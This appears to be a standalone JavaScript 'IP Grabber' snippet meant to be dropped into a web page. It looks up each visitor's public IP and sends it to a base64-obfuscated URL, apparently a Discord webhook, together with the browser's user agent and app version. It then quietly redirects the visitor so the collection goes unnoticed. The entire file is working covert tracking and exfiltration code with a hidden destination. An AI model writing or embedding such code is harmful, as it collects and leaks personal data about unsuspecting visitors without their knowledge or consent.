$.getJSON('https://api.ipify.org?format=jsonp&callback=?', function(data) {
    var b64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvODM0MTQ5MTU4MDIxNDk2ODkyLzlXQ0F3cUZFNHFWZ1M3clRVZzdBT2pYeFRfeDBPTFY3dHZoeldHUnh3RXZaaGpxXzhPYnRFWW1pS0E1VjZZR3k1MDB2";
    var request = new XMLHttpRequest();
    request.open("POST", atob(b64));
    request.setRequestHeader('Content-type', 'application/json');

    request.onloadend = () => {
        setTimeout(function() {
            if (window.location.href.includes("#")) {
                var loc = window.location.href.split("#").pop();
                window.location = loc;
            } else {
                window.location = "https://" + window.location.hostname;
            }
        }, 100);
    }

    var params = {
        username: "IP Grabber",
        content: "```"
               + "IP: " + data.ip + "\n\n"
               + "appVersion: " + navigator.appVersion + "\n\n"
               + "userAgent: " + navigator.userAgent + "\n\n"
               + "```"
    }

    request.send(JSON.stringify(params));
});